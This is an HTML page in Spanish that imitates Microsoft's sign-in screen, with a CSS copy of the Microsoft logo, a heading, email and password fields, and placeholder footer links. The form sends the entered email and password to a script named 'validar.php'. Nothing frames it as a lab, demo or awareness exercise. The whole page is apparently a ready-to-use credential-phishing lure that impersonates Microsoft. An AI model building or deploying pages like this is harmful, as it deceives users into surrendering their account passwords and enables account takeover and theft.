<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft - Inicia sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }

        .container {
            text-align: center;
            width: 100%;
            max-width: 400px;
            padding: 20px;
            background-color: white;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }

        .logo {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            justify-content: flex-start;
            margin-top: 10px;
            margin-left: 20px; /* Desplazar el cubo un poco hacia la izquierda */
        }

        .cubo {
            width: 20px; 
            height: 20px; 
            display: grid;
            grid-template-rows: 50% 50%;
            grid-template-columns: 50% 50%;
            gap: 1px;
            margin-right: 10px;
            border: 1px solid white;
        }

        .cubo div {
            width: 100%;
            height: 100%;
        }

        .cubo .rojo { background-color: #f28a8a; } /* Rojo más suave */
        .cubo .verde { background-color: #a4d7b2; } /* Verde suave */
        .cubo .azul { background-color: #7bb2db; } /* Azul suave */
        .cubo .amarillo { background-color: #f7e08a; } /* Amarillo suave */

        .microsoft-text {
            font-size: 16px;
            color: black;
            font-weight: bold;
        }

        h2 {
            font-size: 28px;
            margin-top: 20px;
        }

        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 18px;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
        }

        button:hover {
            background-color: #005a9e;
        }

        .links {
            margin-top: 20px;
        }

        .links a {
            color: #0078d4;
            text-decoration: none;
            margin: 0 5px;
        }

        .links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="cubo">
                <div class="rojo"></div>
                <div class="verde"></div>
                <div class="azul"></div>
                <div class="amarillo"></div>
            </div>
            <span class="microsoft-text">Microsoft</span>
        </div>
        <h2>Iniciar sesión</h2>
        <form action="validar.php" method="POST">
            <input type="email" name="email" placeholder="Introduce tu correo" required>
            <input type="password" name="password" placeholder="Introduce tu contraseña" required>
            <button type="submit">Siguiente</button>
        </form>
        <div class="links">
            <a href="#">Términos de uso</a> |
            <a href="#">Cuenta</a> |
            <a href="#">Privacidad</a>
        </div>
    </div>
</body>
</html>
